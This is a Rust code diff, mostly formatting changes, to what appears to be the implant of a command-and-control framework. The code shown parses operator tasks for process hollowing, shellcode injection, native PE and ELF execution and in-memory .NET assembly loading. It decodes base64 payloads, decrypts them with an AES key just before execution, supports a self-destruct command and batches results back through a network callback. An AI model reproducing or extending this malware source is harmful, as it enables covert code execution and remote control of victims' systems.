@@ -7,13 +7,13 @@ use crate::types::CommandResult;
 use log::{debug, error, info, warn};
 
 use base64::Engine;
+use lazy_static::lazy_static;
+use serde::{Deserialize, Serialize};
+use std::collections::HashMap;
 use std::collections::VecDeque;
 use std::sync::{Arc, Mutex as SyncMutex};
-use tokio::sync::{Mutex, mpsc, oneshot};
+use tokio::sync::{mpsc, oneshot, Mutex};
 use tokio::time::{Duration, Instant};
-use serde::{Serialize, Deserialize};
-use std::collections::HashMap;
-use lazy_static::lazy_static;
 
 lazy_static! {
     /// In-memory cache for synced plugins (max 20 entries, ~50MB cap)
@@ -125,12 +125,16 @@ pub struct BatchExecutionManager {
     /// Result buffer
     result_buffer: Arc<Mutex<VecDeque<BufferedResult>>>,
     /// Network callback for sending results
-    network_callback: SyncMutex<Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>>,
+    network_callback: SyncMutex<
+        Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>,
+    >,
     /// Shared with background task for periodic flush
     network_callback_shared: Option<
         Arc<
             SyncMutex<
-                Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>,
+                Option<
+                    Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>,
+                >,
             >,
         >,
     >,
@@ -143,7 +147,7 @@ impl BatchExecutionManager {
     pub fn new(config: BatchConfig) -> Self {
         let (task_tx, task_rx) = mpsc::unbounded_channel();
         let result_buffer = Arc::new(Mutex::new(VecDeque::new()));
-        
+
         let mut manager = Self {
             config,
             task_tx,
@@ -152,38 +156,35 @@ impl BatchExecutionManager {
             network_callback_shared: None,
             manager_handle: SyncMutex::new(None),
         };
-        
+
         // Start the background manager with shared callback handle
         let callback_shared = Arc::new(SyncMutex::new(
             None::<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>,
         ));
         manager.network_callback_shared = Some(callback_shared.clone());
         manager.start_background_manager(task_rx, callback_shared);
-        
+
         manager
     }
-    
+
     /// Submit plugin task for asynchronous execution
     pub async fn submit_task(&self, task: PluginTask) -> Result<String, String> {
         let (response_tx, response_rx) = oneshot::channel();
-        
-        let request = BatchExecutionRequest {
-            task,
-            response_tx,
-        };
-        
+
+        let request = BatchExecutionRequest { task, response_tx };
+
         // Send task to background manager
         if let Err(_) = self.task_tx.send(request) {
             return Err("Batch execution manager is not running".to_string());
         }
-        
+
         // Wait for immediate acknowledgment
         match response_rx.await {
             Ok(result) => result,
             Err(_) => Err("Failed to receive task acknowledgment".to_string()),
         }
     }
-    
+
     /// Get current buffer status
     pub async fn get_buffer_status(&self) -> (usize, usize) {
         let buffer = self.result_buffer.lock().await;
@@ -191,7 +192,10 @@ impl BatchExecutionManager {
     }
 
     /// Set network callback for sending results
-    pub fn set_network_callback(&self, callback: Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>) {
+    pub fn set_network_callback(
+        &self,
+        callback: Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>,
+    ) {
         if let Ok(mut cb) = self.network_callback.lock() {
             *cb = Some(callback.clone());
         }
@@ -201,12 +205,12 @@ impl BatchExecutionManager {
             }
         }
     }
-    
+
     /// Force flush all buffered results
     pub async fn flush_buffer(&self) -> usize {
         let mut buffer = self.result_buffer.lock().await;
         let count = buffer.len();
-        
+
         let callback_opt = if let Ok(cb) = self.network_callback.lock() {
             cb.clone()
         } else {
@@ -216,21 +220,27 @@ impl BatchExecutionManager {
         if count > 0 && callback_opt.is_some() {
             let results: Vec<BufferedResult> = buffer.drain(..).collect();
             drop(buffer); // Release lock before network call
-            
+
             if let Some(callback) = callback_opt {
                 // Keep backup for retry logic
                 let backup_results = results.clone();
                 let buffer_clone = Arc::clone(&self.result_buffer);
                 let max_retries = self.config.max_retries;
                 let handle = callback(results);
-                
+
                 // Don't wait for network call to complete
                 tokio::spawn(async move {
                     let success = handle.await.unwrap_or(false);
                     if success {
-                        info!("Successfully flushed {} buffered results", backup_results.len());
+                        info!(
+                            "Successfully flushed {} buffered results",
+                            backup_results.len()
+                        );
                     } else {
-                        warn!("Failed to flush {} buffered results, adding back to queue", backup_results.len());
+                        warn!(
+                            "Failed to flush {} buffered results, adding back to queue",
+                            backup_results.len()
+                        );
                         let mut buffer = buffer_clone.lock().await;
                         // Push back in reverse to maintain original chronological order at the front of the queue
                         for mut res in backup_results.into_iter().rev() {
@@ -238,53 +248,61 @@ impl BatchExecutionManager {
                                 res.retry_count += 1;
                                 buffer.push_front(res);
                             } else {
-                                warn!("Result {} reached max retries ({}), dropping", res.task_id, max_retries);
+                                warn!(
+                                    "Result {} reached max retries ({}), dropping",
+                                    res.task_id, max_retries
+                                );
                             }
                         }
                     }
                 });
             }
         }
-        
+
         count
     }
-    
+
     /// Start background manager task
     fn start_background_manager(
         &mut self,
         mut task_rx: mpsc::UnboundedReceiver<BatchExecutionRequest>,
         callback_shared: Arc<
             SyncMutex<
-                Option<Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>>,
+                Option<
+                    Arc<dyn Fn(Vec<BufferedResult>) -> tokio::task::JoinHandle<bool> + Send + Sync>,
+                >,
             >,
         >,
     ) {
         let config = self.config.clone();
         let result_buffer = Arc::clone(&self.result_buffer);
-        
+
         let handle = tokio::spawn(async move {
-            let mut flush_interval = tokio::time::interval(Duration::from_secs(config.flush_interval_secs));
-            
-            info!("🚀 Batch execution manager started (max_concurrent: {}, buffer_size: {})", 
-                  config.max_concurrent, config.max_buffer_size);
-            
+            let mut flush_interval =
+                tokio::time::interval(Duration::from_secs(config.flush_interval_secs));
+
+            info!(
+                "🚀 Batch execution manager started (max_concurrent: {}, buffer_size: {})",
+                config.max_concurrent, config.max_buffer_size
+            );
+
             loop {
                 tokio::select! {
                     // Handle new task requests
                     Some(request) = task_rx.recv() => {
                         let task_id = request.task.task_id.clone();
                         let task_id_for_response = task_id.clone();
-                        
+
                         // Execute task asynchronously (simplified without semaphore for now)
                         let buffer_clone = Arc::clone(&result_buffer);
                         let config_clone = config.clone();
-                        
+
                         tokio::spawn(async move {
                             let start_time = Instant::now();
                             let timeout_secs = request.task.metadata.as_ref()
                                 .and_then(|m| m.timeout_seconds)
                                 .unwrap_or(300); // 5 minute default
-                            
+
                             // JIT Decryption: Final stage decryption before execution
                             let mut task = request.task;
                             let key = crate::config::get_aes_key();
@@ -303,9 +321,9 @@ impl BatchExecutionManager {
                                     req_id: None,
                                 },
                             };
-                            
+
                             let duration = start_time.elapsed();
-                            
+
                             // Buffer the result
                             let buffered_result = BufferedResult {
                                 task_id: task_id.clone(),
@@ -318,26 +336,26 @@ impl BatchExecutionManager {
                                 duration_ms: duration.as_millis() as u64,
                                 retry_count: 0,
                             };
-                            
+
                             // Add to buffer
                             let mut buffer = buffer_clone.lock().await;
                             buffer.push_back(buffered_result);
-                            
+
                             // Trim buffer if too large
                             while buffer.len() > config_clone.max_buffer_size {
                                 if let Some(dropped) = buffer.pop_front() {
                                     warn!("Dropped buffered result due to buffer overflow: {}", dropped.task_id);
                                 }
                             }
-                            
-                            debug!("Task {} completed in {}ms (timeout: {}s), buffer size: {}", 
+
+                            debug!("Task {} completed in {}ms (timeout: {}s), buffer size: {}",
                                    task_id, duration.as_millis(), timeout_secs, buffer.len());
                         });
-                        
+
                         // Send immediate acknowledgment
                         let _ = request.response_tx.send(Ok(task_id_for_response));
                     }
-                    
+
                     // Periodic buffer flush via shared network callback
                     _ = flush_interval.tick() => {
                         let cb_opt = callback_shared.lock().ok().and_then(|g| g.clone());
@@ -368,7 +386,7 @@ impl BatchExecutionManager {
                             }
                         }
                     }
-                    
+
                     // Handle shutdown (when all senders are dropped)
                     else => {
                         info!("Batch execution manager shutting down");
@@ -377,7 +395,7 @@ impl BatchExecutionManager {
                 }
             }
         });
-        
+
         if let Ok(mut handle_lock) = self.manager_handle.lock() {
             *handle_lock = Some(handle);
         }
@@ -392,25 +410,25 @@ impl PluginRouter {
     pub fn cache_plugin(id: String, data: Vec<u8>) {
         if let Ok(mut cache) = PLUGIN_CACHE.lock() {
             let data_size = data.len();
-            
+
             // Reject single plugins larger than half the cache limit
             if data_size > MAX_PLUGIN_CACHE_BYTES / 2 {
                 warn!("Plugin {} too large ({} bytes), not caching", id, data_size);
                 return;
             }
-            
+
             // Evict until we have space
             if let Ok(mut order) = PLUGIN_CACHE_ORDER.lock() {
                 // Remove existing entry from order if re-caching
                 order.retain(|x| x != &id);
-                
+
                 // Evict oldest entries if over count limit
                 while order.len() >= MAX_PLUGIN_CACHE_ENTRIES {
                     if let Some(oldest) = order.pop_front() {
                         cache.remove(&oldest);
                     }
                 }
-                
+
                 // Evict until total size is under limit
                 let mut total_size: usize = cache.values().map(|v| v.len()).sum();
                 while total_size + data_size > MAX_PLUGIN_CACHE_BYTES && !order.is_empty() {
@@ -420,10 +438,10 @@ impl PluginRouter {
                         }
                     }
                 }
-                
+
                 order.push_back(id.clone());
             }
-            
+
             debug!("Caching plugin: {} ({} bytes)", id, data_size);
             cache.insert(id, data);
         }
@@ -449,26 +467,33 @@ impl PluginRouter {
         warn!("⚠️ Using deprecated execute_plugin method. Consider using BatchExecutionManager for better performance.");
         Self::execute_plugin_internal(task).await
     }
-    
+
     /// Internal plugin execution method
     async fn execute_plugin_internal(task: PluginTask) -> CommandResult {
-        info!("🔌 PLUGIN ROUTER: Executing plugin type '{}'", task.execution_type);
-        debug!("Data size: {} bytes, Args: {:?}", task.data.len(), task.args);
-        
+        info!(
+            "🔌 PLUGIN ROUTER: Executing plugin type '{}'",
+            task.execution_type
+        );
+        debug!(
+            "Data size: {} bytes, Args: {:?}",
+            task.data.len(),
+            task.args
+        );
+
         if let Some(ref metadata) = task.metadata {
             debug!("Metadata: {:?}", metadata);
         }
-        
+
         let req_id = task.req_id.clone();
-        
+
         // Route to appropriate execution method
         let mut result = Self::route_execution(task).await;
-        
+
         // Set the request ID
         result.req_id = req_id;
         result
     }
-    
+
     /// Route execution based on type and platform
     async fn route_execution(task: PluginTask) -> CommandResult {
         match task.execution_type.as_str() {
@@ -496,7 +521,7 @@ impl PluginRouter {
             }
         }
     }
-    
+
     /// Handle .NET assembly execution
     async fn handle_execute_assembly(task: PluginTask) -> CommandResult {
         #[cfg(all(feature = "dotnet", target_os = "windows"))]
@@ -527,7 +552,6 @@ impl PluginRouter {
         crate::utils::self_destruct().await
     }
 
-    
     /// Return error for unsupported platform
     #[allow(dead_code)]
     fn unsupported_on_platform(execution_type: &str, required_platform: &str) -> CommandResult {
@@ -542,14 +566,18 @@ impl PluginRouter {
             req_id: None,
         }
     }
-    
+
     /// Parse plugin task from command payload
-    pub fn parse_plugin_task(execution_type: &str, command_content: &str, req_id: Option<String>) -> Result<PluginTask, String> {
+    pub fn parse_plugin_task(
+        execution_type: &str,
+        command_content: &str,
+        req_id: Option<String>,
+    ) -> Result<PluginTask, String> {
         let content = command_content.trim();
-        
+
         // Generate unique task ID
         let task_id = format!("task_{}_{:08x}", execution_type, crate::utils::next_u32());
-        
+
         // Special case: self-destruct can have empty content
         if execution_type == "self-destruct" {
             return Ok(PluginTask {
@@ -562,7 +590,7 @@ impl PluginRouter {
                 plugin_id: None,
             });
         }
-        
+
         if content.is_empty() {
             return Err("Plugin command content is empty".to_string());
         }
@@ -572,9 +600,12 @@ impl PluginRouter {
             let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
             let id = parts[0];
             let args_part = if parts.len() > 1 { parts[1] } else { "" };
-            
+
             if let Some(cached_data) = Self::get_cached_plugin(id) {
-                let args = args_part.split_whitespace().map(|s| s.to_string()).collect();
+                let args = args_part
+                    .split_whitespace()
+                    .map(|s| s.to_string())
+                    .collect();
                 return Ok(PluginTask {
                     execution_type: execution_type.to_string(),
                     data: cached_data,
@@ -588,7 +619,7 @@ impl PluginRouter {
                 return Err(format!("Plugin with ID '{}' not found in cache", id));
             }
         }
-        
+
         match execution_type {
             "hollow-shellcode" | "native-pe" | "shellcode-inject" => {
                 // Format: "target_exe|base64_shellcode" or just "base64_shellcode"
@@ -598,10 +629,11 @@ impl PluginRouter {
                 } else {
                     (None, content)
                 };
-                
-                let shellcode = base64::engine::general_purpose::STANDARD.decode(shellcode_b64.trim())
+
+                let shellcode = base64::engine::general_purpose::STANDARD
+                    .decode(shellcode_b64.trim())
                     .map_err(|e| format!("Invalid base64 payload: {}", e))?;
-                
+
                 Ok(PluginTask {
                     execution_type: execution_type.to_string(),
                     data: shellcode,
@@ -622,17 +654,29 @@ impl PluginRouter {
             "execute-assembly" => {
                 // Format: "app_domain|args|base64_assembly" or "args|base64_assembly" or "base64_assembly"
                 let parts: Vec<&str> = content.split('|').collect();
-                
+
                 let (app_domain, args, assembly_b64) = match parts.len() {
                     1 => (None, vec![], parts[0]),
-                    2 => (None, parts[0].split_whitespace().map(|s| s.to_string()).collect(), parts[1]),
-                    3 => (Some(parts[0].to_string()), parts[1].split_whitespace().map(|s| s.to_string()).collect(), parts[2]),
-                    _ => return Err("Invalid assembly format, expected: [app_domain|][args|]base64_assembly".to_string()),
+                    2 => (
+                        None,
+                        parts[0].split_whitespace().map(|s| s.to_string()).collect(),
+                        parts[1],
+                    ),
+                    3 => (
+                        Some(parts[0].to_string()),
+                        parts[1].split_whitespace().map(|s| s.to_string()).collect(),
+                        parts[2],
+                    ),
+                    _ => return Err(
+                        "Invalid assembly format, expected: [app_domain|][args|]base64_assembly"
+                            .to_string(),
+                    ),
                 };
-                
-                let assembly_bytes = base64::engine::general_purpose::STANDARD.decode(assembly_b64.trim())
+
+                let assembly_bytes = base64::engine::general_purpose::STANDARD
+                    .decode(assembly_b64.trim())
                     .map_err(|e| format!("Invalid base64 assembly data: {}", e))?;
-                
+
                 Ok(PluginTask {
                     execution_type: execution_type.to_string(),
                     data: assembly_bytes,
@@ -658,10 +702,11 @@ impl PluginRouter {
                 } else {
                     (None, content)
                 };
-                
-                let elf_bytes = base64::engine::general_purpose::STANDARD.decode(elf_b64.trim())
+
+                let elf_bytes = base64::engine::general_purpose::STANDARD
+                    .decode(elf_b64.trim())
                     .map_err(|e| format!("Invalid base64 payload data: {}", e))?;
-                
+
                 Ok(PluginTask {
                     execution_type: execution_type.to_string(),
                     data: elf_bytes,
@@ -682,12 +727,14 @@ impl PluginRouter {
 
             _ => {
                 // Generic format: try to decode as base64 or use as raw data
-                let data = if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(content) {
+                let data = if let Ok(decoded) =
+                    base64::engine::general_purpose::STANDARD.decode(content)
+                {
                     decoded
                 } else {
                     content.as_bytes().to_vec()
                 };
-                
+
                 Ok(PluginTask {
                     execution_type: execution_type.to_string(),
                     data,
@@ -700,9 +747,12 @@ impl PluginRouter {
             }
         }
     }
-    
+
     /// Parse plugin task from command payload (backward compatibility)
-    pub fn parse_plugin_task_compat(execution_type: &str, command_content: &str) -> Result<PluginTask, String> {
+    pub fn parse_plugin_task_compat(
+        execution_type: &str,
+        command_content: &str,
+    ) -> Result<PluginTask, String> {
         Self::parse_plugin_task(execution_type, command_content, None)
     }
 }
